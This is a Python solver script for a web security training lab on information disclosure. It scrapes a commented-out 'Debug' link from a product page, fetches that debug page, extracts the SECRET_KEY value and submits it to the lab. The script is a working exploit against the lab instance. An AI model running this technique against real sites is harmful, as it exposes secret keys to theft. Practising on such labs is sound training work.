####################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 2/9/2023
#
# Lab: Information disclosure on debug page
#
# Steps: 1. Check the source code of a product page
#        2. GET the href of the commented a tag named "Debug"
#        3. Extract the secret key
#        4. submit solution
#
####################################################################


###########
# imports
###########
import requests
import re
from colorama import Fore


#########
# Main
#########

# change this to your lab URL
url = "https://0a420004032f51c48031179d0061006f.web-security-academy.net"

try:
    # check the source code of a product page
    inject_payload = requests.get(f"{url}/product?productId=4") 

except:
    print(Fore.RED + "[!] Failed to inject the payload through exception")
    exit(1)

print(Fore.WHITE + "1. Checking the source code.. " + Fore.GREEN + "OK")

# extract the debug path; change this if it's changed in you cases
debug_path = re.findall("href=(.*)>Debug", inject_payload.text)[0]  

print(Fore.WHITE + "2. Extracting the debug path.. " + Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + debug_path)

try:  
    # get the debug page
    debug_page = requests.get(f"{url}{debug_path}")

except:
    print(Fore.RED + "[!] Failed to get the debug page through exception")
    exit(1)

print(Fore.WHITE + "3. Fetching the debug page.. " + Fore.GREEN + "OK")

# extract the secret key
secret_key = re.findall("SECRET_KEY.*class=\"v\">(.*) <", debug_page.text)[0]  

print(Fore.WHITE + "4. Extracting the secret key.. " + Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + secret_key)

# data to send via POST  
data = {
    "answer": secret_key
}

try:
    # submit solution
    submit_answer = requests.post(f"{url}/submitsolution", data)

except:
    print(Fore.RED + "[!] Failed to submit solution through exception")
    exit(1)

print(Fore.WHITE + "5. Submitting solution.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")



